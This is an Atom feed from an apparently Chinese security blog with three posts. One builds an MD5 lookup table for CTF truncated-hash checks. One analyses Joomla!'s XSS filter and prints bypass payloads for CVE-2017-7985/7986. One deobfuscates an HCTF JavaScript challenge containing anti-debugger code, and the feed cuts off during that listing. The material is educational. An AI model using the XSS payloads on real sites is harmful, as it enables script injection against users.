<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MSAREHERE</title>
  <icon>https://www.gravatar.com/avatar/136b0de13f3affbb7643d3f2f821338d</icon>
  <subtitle>Just have a little faith</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://michaelwayneliu.github.io/"/>
  <updated>2018-08-28T03:03:44.638Z</updated>
  <id>https://michaelwayneliu.github.io/</id>
  
  <author>
    <name>MS</name>
    <email>18380217351@163.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【CTF】MD5截断比较</title>
    <link href="https://michaelwayneliu.github.io/2018/08/28/%E3%80%90CTF%E3%80%91MD5%E6%88%AA%E6%96%AD%E6%AF%94%E8%BE%83/"/>
    <id>https://michaelwayneliu.github.io/2018/08/28/【CTF】MD5截断比较/</id>
    <published>2018-08-28T02:48:43.000Z</published>
    <updated>2018-08-28T03:03:44.638Z</updated>
    
    <content type="html"><![CDATA[<p>ctf中经常用MD5的截断比较做验证。<br><a id="more"></a><br>ctf中经常用MD5的截断比较做验证。可以使用空间换时间。改了下别人的脚本，几分钟生成了6个多G文件，觉得差不多就停了。。。</p><p>生成脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">sum = []</span><br><span class="line">j = 0</span><br><span class="line">f = open(&quot;gen_md5.txt&quot;, &quot;a&quot;)</span><br><span class="line">for i in xrange(1000000000):</span><br><span class="line">    tmp = (hashlib.md5(str(i)).hexdigest(),i)</span><br><span class="line">    sum.append(tmp)</span><br><span class="line">    j = j+1</span><br><span class="line">    if(j==10000000):</span><br><span class="line">        for i in sum:</span><br><span class="line">            f.write(&quot;&#123;0&#125; &#123;1&#125;&quot;.format(i,&quot;\n&quot;))</span><br><span class="line">        j=0</span><br><span class="line">        sum = []</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat gen_md5.txt | grep  \(\&apos;54d7ed</span><br></pre></td></tr></table></figure></p><p>匹配前几位，grep支持正则-E很方便。</p><p>或者使用python匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">class Load_Corpus_with_Iteration(object): # 使用迭代器读取</span><br><span class="line">    def __init__(self, path):</span><br><span class="line">        self.path = path</span><br><span class="line"> </span><br><span class="line">    def __iter__(self):</span><br><span class="line">        for line in open(self.path):</span><br><span class="line">            yield line.split()</span><br><span class="line"> </span><br><span class="line">corpus = Load_Corpus_with_Iteration(&apos;gen_md5.txt&apos;)</span><br><span class="line">for item in corpus:</span><br><span class="line">    # print item</span><br><span class="line">    if(item[0].startswith(&quot;(&apos;3322cf&quot;)):</span><br><span class="line">        print item</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="http://www.beesfun.com/2017/03/21/【CTF】MD5截断比较/" target="_blank" rel="noopener">http://www.beesfun.com/2017/03/21/【CTF】MD5截断比较/</a></p><p><a href="https://strcpy.me/index.php/archives/685/" target="_blank" rel="noopener">https://strcpy.me/index.php/archives/685/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ctf中经常用MD5的截断比较做验证。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://michaelwayneliu.github.io/tags/CTF/"/>
    
      <category term="MD5" scheme="https://michaelwayneliu.github.io/tags/MD5/"/>
    
  </entry>
  
  <entry>
    <title>Joomla! XSS过滤规则</title>
    <link href="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/"/>
    <id>https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/</id>
    <published>2018-01-19T08:51:46.000Z</published>
    <updated>2018-01-19T09:00:03.422Z</updated>
    
    <content type="html"><![CDATA[<p>Joomla! XSS过滤规则<br><a id="more"></a><br>基于CVE-2017-7985&amp;7986，利用方式参考<a href="http://bobao.360.cn/learning/detail/3817.html" target="_blank" rel="noopener">这里</a>，payload很有意思<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;form /&gt;&lt;button formaction=&quot;javascript&amp;colon;alert(1)&quot;&gt;heihei&lt;/button&gt;</span><br><span class="line">2.style=&quot;background:url()&apos;&quot;&gt;&amp;colon;</span><br><span class="line">&lt;img src=x onerror=alert(1) x=&lt;a href=&quot;test&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>看看它的过滤规则：<br>1.过滤属性值—&gt;转义属性值引号间的&lt; &gt;  “三个符号。<br><img src="/2018/01/19/Joomla-XSS过滤规则/1.png" alt="image"><br>2.去除/<em>**</em>/，把类似“:expression(”的”:expression”全去掉<br>3.去掉所有匹配&gt;的多余的&lt;，比如&lt;&lt;&lt;&lt;&gt;   ——&gt;   &lt;&gt;<br>4.&lt;&gt;没闭合，就取最后一个&lt;后的内容，前面都忽略<br>5.如果标签嵌套如&lt;&lt;<img src="">&gt;&gt;，迭代取到最里面的标签<img src="">判断<br>6.取出标签名，不是数字字母组成舍弃，没有标签名舍弃，在黑名单舍弃<br><img src="/2018/01/19/Joomla-XSS过滤规则/2.png" alt="image"><br><img src="/2018/01/19/Joomla-XSS过滤规则/3.png" alt="image"></p><p>7.根据空格定界属性和属性值，根据=号分割属性和属性值。如果之后没有=号，就把属性值一直取到/处。属性值被引号包围，就把它从引号中取出来，否则就取到下一个括号的地方。<br><img src="/2018/01/19/Joomla-XSS过滤规则/4.png" alt="image"><br>8.过滤属性及属性值。多个属性值取最后一个。去除属性值空格、实体编码值、\n\r、双引号、反斜杠。<br><img src="/2018/01/19/Joomla-XSS过滤规则/5.png" alt="image"><br><img src="/2018/01/19/Joomla-XSS过滤规则/6.png" alt="image"></p><p>就这样joomla!都被搞了，继续学习吧~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Joomla! XSS过滤规则&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端安全" scheme="https://michaelwayneliu.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Joomla!" scheme="https://michaelwayneliu.github.io/tags/Joomla/"/>
    
      <category term="XSS" scheme="https://michaelwayneliu.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>一例js混淆分析</title>
    <link href="https://michaelwayneliu.github.io/2018/01/13/%E4%B8%80%E4%BE%8Bjs%E6%B7%B7%E6%B7%86%E5%88%86%E6%9E%90/"/>
    <id>https://michaelwayneliu.github.io/2018/01/13/一例js混淆分析/</id>
    <published>2018-01-13T02:46:21.000Z</published>
    <updated>2018-01-13T02:51:58.976Z</updated>
    
    <content type="html"><![CDATA[<p>JS混淆分析<br><a id="more"></a></p><h3 id="拿到代码找思路"><a href="#拿到代码找思路" class="headerlink" title="拿到代码找思路"></a>拿到代码找思路</h3><p>第一次处理混淆，找了半天找到了<a href="http://cnodejs.org/topic/55b3116c692e0e7706b36754" target="_blank" rel="noopener">这个</a><br>，于是接下来要做的事就是针对下面三个点做逆向分析</p><ul><li>字符串字面量混淆：首先提取全部的字符串，在全局作用域创建一个字符串数组，同时转义字符增大阅读难度，然后将字符串出现的地方替换成为数组元素的引用。</li><li>变量名混淆：不同于压缩器的缩短命名，此处使用了下划线加数字的格式，变量之间区分度很低，相比单个字母更难以阅读。</li><li>成员运算符混淆：在 Javascript 中，window[‘top’] 和 window.top 是等价的。混淆器便利用这一特性，将成员访问复杂化，首先替换成字符串，然后对字符串进行混淆。<h3 id="分析语法逆向"><a href="#分析语法逆向" class="headerlink" title="分析语法逆向"></a>分析语法逆向</h3>使用工具 JavascriptObfuscator ，以 esprima 作为 javascript parser 工具，代码在<a href="http://cnodejs.org/topic/55b3116c692e0e7706b36754" target="_blank" rel="noopener">这</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0x180a=[&apos;random&apos;,&apos;charCodeAt&apos;,&apos;fromCharCode&apos;,&apos;parse&apos;,&apos;substr&apos;,&apos;\x5cw+&apos;,&apos;replace&apos;,&apos;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&apos;,&apos;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&apos;,&apos;pop&apos;,&apos;length&apos;,&apos;join&apos;,&apos;getElementById&apos;,&apos;message&apos;,&apos;log&apos;,&apos;Welcome\x20to\x20HCTF:&gt;&apos;,&apos;Congratulations!\x20you\x20got\x20it!&apos;,&apos;Sorry,\x20you\x20are\x20wrong...&apos;,&apos;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&apos;,&apos;version&apos;,&apos;error&apos;,&apos;download&apos;,&apos;substring&apos;,&apos;push&apos;,&apos;Function&apos;,&apos;charAt&apos;,&apos;idle&apos;,&apos;pyW5F1U43VI&apos;,&apos;init&apos;,&apos;https://the-extension.com&apos;,&apos;local&apos;,&apos;storage&apos;,&apos;eval&apos;,&apos;then&apos;,&apos;get&apos;,&apos;getTime&apos;,&apos;setUTCHours&apos;,&apos;origin&apos;,&apos;set&apos;,&apos;GET&apos;,&apos;loading&apos;,&apos;status&apos;,&apos;removeListener&apos;,&apos;onUpdated&apos;,&apos;callee&apos;,&apos;addListener&apos;,&apos;onMessage&apos;,&apos;runtime&apos;,&apos;executeScript&apos;,&apos;data&apos;,&apos;test&apos;,&apos;http://&apos;,&apos;Url\x20error&apos;,&apos;query&apos;,&apos;filter&apos;,&apos;active&apos;,&apos;floor&apos;];(function(_0xd4b7d6,_0xad25ab)&#123;var _0x5e3956=function(_0x1661d3)&#123;while(--_0x1661d3)&#123;_0xd4b7d6[&apos;push&apos;](_0xd4b7d6[&apos;shift&apos;]());&#125;&#125;;_0x5e3956(++_0xad25ab);&#125;(_0x180a,0x1a2));var _0xa180=function(_0x5c351c,_0x2046d8)&#123;_0x5c351c=_0x5c351c-0x0;var _0x26f3b3=_0x180a[_0x5c351c];return _0x26f3b3;&#125;;function check(_0x5b7c0c)&#123;try&#123;var _0x2e2f8d=[&apos;code&apos;,_0xa180(&apos;0x0&apos;),_0xa180(&apos;0x1&apos;),_0xa180(&apos;0x2&apos;),&apos;invalidMonetizationCode&apos;,_0xa180(&apos;0x3&apos;),_0xa180(&apos;0x4&apos;),_0xa180(&apos;0x5&apos;),_0xa180(&apos;0x6&apos;),_0xa180(&apos;0x7&apos;),_0xa180(&apos;0x8&apos;),_0xa180(&apos;0x9&apos;),_0xa180(&apos;0xa&apos;),_0xa180(&apos;0xb&apos;),_0xa180(&apos;0xc&apos;),_0xa180(&apos;0xd&apos;),_0xa180(&apos;0xe&apos;),_0xa180(&apos;0xf&apos;),_0xa180(&apos;0x10&apos;),_0xa180(&apos;0x11&apos;),&apos;url&apos;,_0xa180(&apos;0x12&apos;),_0xa180(&apos;0x13&apos;),_0xa180(&apos;0x14&apos;),_0xa180(&apos;0x15&apos;),_0xa180(&apos;0x16&apos;),_0xa180(&apos;0x17&apos;),_0xa180(&apos;0x18&apos;),&apos;tabs&apos;,_0xa180(&apos;0x19&apos;),_0xa180(&apos;0x1a&apos;),_0xa180(&apos;0x1b&apos;),_0xa180(&apos;0x1c&apos;),_0xa180(&apos;0x1d&apos;),&apos;replace&apos;,_0xa180(&apos;0x1e&apos;),_0xa180(&apos;0x1f&apos;),&apos;includes&apos;,_0xa180(&apos;0x20&apos;),&apos;length&apos;,_0xa180(&apos;0x21&apos;),_0xa180(&apos;0x22&apos;),_0xa180(&apos;0x23&apos;),_0xa180(&apos;0x24&apos;),_0xa180(&apos;0x25&apos;),_0xa180(&apos;0x26&apos;),_0xa180(&apos;0x27&apos;),_0xa180(&apos;0x28&apos;),_0xa180(&apos;0x29&apos;),&apos;toString&apos;,_0xa180(&apos;0x2a&apos;),&apos;split&apos;];var _0x50559f=_0x5b7c0c[_0x2e2f8d[0x5]](0x0,0x4);var _0x5cea12=parseInt(btoa(_0x50559f),0x20);eval(function(_0x200db2,_0x177f13,_0x46da6f,_0x802d91,_0x2d59cf,_0x2829f2)&#123;_0x2d59cf=function(_0x4be75f)&#123;return _0x4be75f[&apos;toString&apos;](_0x177f13);&#125;;if(!&apos;&apos;[&apos;replace&apos;](/^/,String))&#123;while(_0x46da6f--)_0x2829f2[_0x2d59cf(_0x46da6f)]=_0x802d91[_0x46da6f]||_0x2d59cf(_0x46da6f);_0x802d91=[function(_0x5e8f1a)&#123;return _0x2829f2[_0x5e8f1a];&#125;];_0x2d59cf=function()&#123;return _0xa180(&apos;0x2b&apos;);&#125;;_0x46da6f=0x1;&#125;;while(_0x46da6f--)if(_0x802d91[_0x46da6f])_0x200db2=_0x200db2[_0xa180(&apos;0x2c&apos;)](new RegExp(&apos;\x5cb&apos;+_0x2d59cf(_0x46da6f)+&apos;\x5cb&apos;,&apos;g&apos;),_0x802d91[_0x46da6f]);return _0x200db2;&#125;(_0xa180(&apos;0x2d&apos;),0x11,0x11,_0xa180(&apos;0x2e&apos;)[&apos;split&apos;](&apos;|&apos;),0x0,&#123;&#125;));(function(_0x3291b7,_0xced890)&#123;var _0xaed809=function(_0x3aba26)&#123;while(--_0x3aba26)&#123;_0x3291b7[_0xa180(&apos;0x4&apos;)](_0x3291b7[&apos;shift&apos;]());&#125;&#125;;_0xaed809(++_0xced890);&#125;(_0x2e2f8d,_0x5cea12%0x7b));var _0x43c8d1=function(_0x3120e0)&#123;var _0x3120e0=parseInt(_0x3120e0,0x10);var _0x3a882f=_0x2e2f8d[_0x3120e0];return _0x3a882f;&#125;;var _0x1c3854=function(_0x52ba71)&#123;var _0x52b956=&apos;0x&apos;;for(var _0x59c050=0x0;_0x59c050&lt;_0x52ba71[_0x43c8d1(0x8)];_0x59c050++)&#123;_0x52b956+=_0x52ba71[_0x43c8d1(&apos;f&apos;)](_0x59c050)[_0x43c8d1(0xc)](0x10);&#125;return _0x52b956;&#125;;var _0x76e1e8=_0x5b7c0c[_0x43c8d1(0xe)](&apos;_&apos;);var _0x34f55b=(_0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](-0x2,0x2))^_0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](0x4,0x1)))%_0x76e1e8[0x0][_0x43c8d1(0x8)]==0x5;if(!_0x34f55b)&#123;return![];&#125;b2c=function(_0x3f9bc5)&#123;var _0x3c3bd8=&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&apos;;var _0x4dc510=[];var _0x4a199f=Math[_0xa180(&apos;0x25&apos;)](_0x3f9bc5[_0x43c8d1(0x8)]/0x5);var _0x4ee491=_0x3f9bc5[_0x43c8d1(0x8)]%0x5;if(_0x4ee491!=0x0)&#123;for(var _0x1e1753=0x0;_0x1e1753&lt;0x5-_0x4ee491;_0x1e1753++)&#123;_0x3f9bc5+=&apos;&apos;;&#125;_0x4a199f+=0x1;&#125;for(_0x1e1753=0x0;_0x1e1753&lt;_0x4a199f;_0x1e1753++)&#123;_0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)](_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5)&gt;&gt;0x3));_0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5)&amp;0x7)&lt;&lt;0x2|_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x1)&gt;&gt;0x6));_0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x1)&amp;0x3f)&gt;&gt;0x1));_0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x1)&amp;0x1)&lt;&lt;0x4|_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x2)&gt;&gt;0x4));_0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x2)&amp;0xf)&lt;&lt;0x1|_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x3)&gt;&gt;0x7));_0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x3)&amp;0x7f)&gt;&gt;0x2));_0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x3)&amp;0x3)&lt;&lt;0x3|_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x4)&gt;&gt;0x5));_0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)](_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753*0x5+0x4)&amp;0x1f));&#125;var _0x545c12=0x0;if(_0x4ee491==0x1)_0x545c12=0x6;else if(_0x4ee491==0x2)_0x545c12=0x4;else if(_0x4ee491==0x3)_0x545c12=0x3;else if(_0x4ee491==0x4)_0x545c12=0x1;for(_0x1e1753=0x0;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[_0xa180(&apos;0x2f&apos;)]();for(_0x1e1753=0x0;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[_0x43c8d1(&apos;1b&apos;)](&apos;=&apos;);(function()&#123;(function _0x3c3bd8()&#123;try&#123;(function _0x4dc510(_0x460a91)&#123;if((&apos;&apos;+_0x460a91/_0x460a91)[_0xa180(&apos;0x30&apos;)]!==0x1||_0x460a91%0x14===0x0)&#123;(function()&#123;&#125;[&apos;constructor&apos;](&apos;debugger&apos;)());&#125;else&#123;debugger;&#125;_0x4dc510(++_0x460a91);&#125;(0x0));&#125;catch(_0x30f185)&#123;setTimeout(_0x3c3bd8,0x1388);&#125;&#125;());&#125;());return _0x4dc510[_0xa180(&apos;0x31&apos;)](&apos;&apos;);&#125;;e=_0x1c3854(b2c(_0x76e1e8[0x2])[_0x43c8d1(0xe)](&apos;=&apos;)[0x0])^0x53a3f32;if(e!=0x4b7c0a73)&#123;return![];&#125;f=_0x1c3854(b2c(_0x76e1e8[0x3])[_0x43c8d1(0xe)](&apos;=&apos;)[0x0])^e;if(f!=0x4315332)&#123;return![];&#125;n=f*e*_0x76e1e8[0x0][_0x43c8d1(0x8)];h=function(_0x4c466e,_0x28871)&#123;var _0x3ea581=&apos;&apos;;for(var _0x2fbf7a=0x0;_0x2fbf7a&lt;_0x4c466e[_0x43c8d1(0x8)];_0x2fbf7a++)&#123;_0x3ea581+=_0x28871(_0x4c466e[_0x2fbf7a]);&#125;return _0x3ea581;&#125;;j=_0x76e1e8[0x1][_0x43c8d1(0xe)](&apos;3&apos;);if(j[0x0][_0x43c8d1(0x8)]!=j[0x1][_0x43c8d1(0x8)]||(_0x1c3854(j[0x0])^_0x1c3854(j[0x1]))!=0x1613)&#123;return![];&#125;k=_0xffcc52=&gt;_0xffcc52[_0x43c8d1(&apos;f&apos;)]()*_0x76e1e8[0x1][_0x43c8d1(0x8)];l=h(j[0x0],k);if(l!=0x2f9b5072)&#123;return![];&#125;m=_0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x0,0x4))-0x48a05362==n%l;function _0x5a6d56(_0x5a25ab,_0x4a4483)&#123;var _0x55b09f=&apos;&apos;;for(var _0x508ace=0x0;_0x508ace&lt;_0x4a4483;_0x508ace++)&#123;_0x55b09f+=_0x5a25ab;&#125;return _0x55b09f;&#125;if(!m||_0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x5,0x1),0x2)==_0x76e1e8[0x4][_0x43c8d1(0xd)](-0x5,0x4)||_0x76e1e8[0x4][_0x43c8d1(0xd)](-0x2,0x1)-_0x76e1e8[0x4][_0x43c8d1(0xd)](0x4,0x1)!=0x1)&#123;return![];&#125;o=_0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x6,0x2))[_0x43c8d1(0xd)](0x2)==_0x76e1e8[0x4][_0x43c8d1(0xd)](0x6,0x1)[_0x43c8d1(&apos;f&apos;)]()*_0x76e1e8[0x4][_0x43c8d1(0x8)]*0x5;return o&amp;&amp;_0x76e1e8[0x4][_0x43c8d1(0xd)](0x4,0x1)==0x2&amp;&amp;_0x76e1e8[0x4][_0x43c8d1(0xd)](0x6,0x2)==_0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x7,0x1),0x2);&#125;catch(_0x4cbb89)&#123;console[&apos;log&apos;](&apos;gg&apos;);return![];&#125;&#125;function test()&#123;var _0x5bf136=document[_0xa180(&apos;0x32&apos;)](_0xa180(&apos;0x33&apos;))[&apos;value&apos;];if(_0x5bf136==&apos;&apos;)&#123;console[_0xa180(&apos;0x34&apos;)](_0xa180(&apos;0x35&apos;));return![];&#125;var _0x4d0e29=check(_0x5bf136);if(_0x4d0e29)&#123;alert(_0xa180(&apos;0x36&apos;));&#125;else&#123;alert(_0xa180(&apos;0x37&apos;));&#125;&#125;window[&apos;onload&apos;]=function()&#123;setInterval(_0xa180(&apos;0x38&apos;),0x32);test();&#125;;</span><br></pre></td></tr></table></figure><p>代码瞬间变成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line">var _0x180a = [</span><br><span class="line">    &apos;random&apos;,</span><br><span class="line">    &apos;charCodeAt&apos;,</span><br><span class="line">    &apos;fromCharCode&apos;,</span><br><span class="line">    &apos;parse&apos;,</span><br><span class="line">    &apos;substr&apos;,</span><br><span class="line">    